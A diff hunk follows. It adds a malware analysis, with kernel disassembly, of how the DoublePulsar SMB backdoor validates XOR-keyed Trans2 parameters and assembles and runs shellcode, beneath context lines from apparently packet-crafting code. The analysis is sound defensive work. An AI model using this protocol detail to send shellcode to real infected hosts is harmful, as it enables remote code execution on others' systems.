@@ -126,3 +126,56 @@ DoublePulsarPacket.SetupCount = setup_count
 DoublePulsarPacket.SetupData = setup_data
 DoublePulsarPacket.Timeout =  "\x25\x89\xEE\x00";
 DoublePulsarPacket.Payload = data
+
+
+The branch for the 0xc8 code shows the checks that need to be passed for shellcode execution.
+
+The first check is shown in the following disassembly:
+
+fffffa80`0226e0fd 4831db          xor     rbx,rbx
+fffffa80`0226e100 4831f6          xor     rsi,rsi
+fffffa80`0226e103 4831ff          xor     rdi,rdi
+fffffa80`0226e106 498b45d8        mov     rax,qword ptr [r13-28h]   ; SESSION_SETUP Parameters pointer
+fffffa80`0226e10a 8b18            mov     ebx,dword ptr [rax]
+fffffa80`0226e10c 8b7004          mov     esi,dword ptr [rax+4]
+fffffa80`0226e10f 8b7808          mov     edi,dword ptr [rax+8]
+fffffa80`0226e112 8b4d48          mov     ecx,dword ptr [rbp+48h]   ; XOR key
+fffffa80`0226e115 31cb            xor     ebx,ecx                   ; Total shellcode size
+fffffa80`0226e117 31ce            xor     esi,ecx                   ; Size of shellcode data in this request
+fffffa80`0226e119 31cf            xor     edi,ecx                   ; Offset within shellcode buffer to start copying data to
+fffffa80`0226e11b 413b7510        cmp     esi,dword ptr [r13+10h]
+fffffa80`0226e11f 757b            jne     fffffa80`0226e19c         ; Invalid parameters
+
+
+Then the comparison determines whether the XORed value from the SESSION_SETUP parameters (offset + 4) matches 
+the Total Data Count field, [r13+10h], of the Trans2 request. 
+  
+This means the second 4-byte block of SESSION_SETUP parameters should be key ^ total data count to pass the first parameter check.
+
+After the first check, another comparison occurs, but this time the comparison is with the first 4-byte block of the SESSION_SETUP parameters:
+
+fffffa80`0226e121 3b5d54          cmp     ebx,dword ptr [rbp+54h]   ; Stored shellcode size
+fffffa80`0226e124 488b454c        mov     rax,qword ptr [rbp+4Ch]   ; Stored shellcode buffer pointer
+fffffa80`0226e128 7416            je      fffffa80`0226e140
+fffffa80`0226e12a e8d1000000      call    fffffa80`0226e200
+fffffa80`0226e12f 488d5304        lea     rdx,[rbx+4]
+fffffa80`0226e133 4831c9          xor     rcx,rcx
+fffffa80`0226e136 ff5510          call    qword ptr [rbp+10h]       ; nt!ExAllocatePool
+fffffa80`0226e139 4889454c        mov     qword ptr [rbp+4Ch],rax   ; Store shellcode pointer
+fffffa80`0226e13d 895d54          mov     dword ptr [rbp+54h],ebx   ; Store shellcode size
+
+
+This comparison checks if a stored global value, [rbp+54h], equals the XORed first 4-byte SESSION_SETUP parameters block. 
+The data stored at [rbp+54h] is zero or the number of bytes that have previously been allocated for the shellcode. 
+If previously allocated bytes match with the 4-byte block, then the rest of that code segment is jumped over. 
+Otherwise, nt!ExAllocatePool is called to allocate a buffer for the shellcode. 
+The shellcode pointer is stored at [rbp+4Ch], and the number of bytes allocated is stored at [rbp+54h].
+  
+  
+The destination for the copied data is an offset into the shellcode buffer, which is specified by the SESSION_SETUP parameters. 
+Then the copied data is decoded using the XOR key, which means the shellcode data in the Trans2 request must be encoded before it is sent to the target. 
+After the loop is finished, the last decoded address is compared with the expected ending address of the shellcode buffer (start of shellcode buffer + total size of shellcode). 
+If the addresses do not match, then a "success" status is returned, but more data is expected in future requests before the shellcode in memory will be executed. 
+If the addresses match, then the shellcode is executed, and the buffer is deallocated.  
+
+
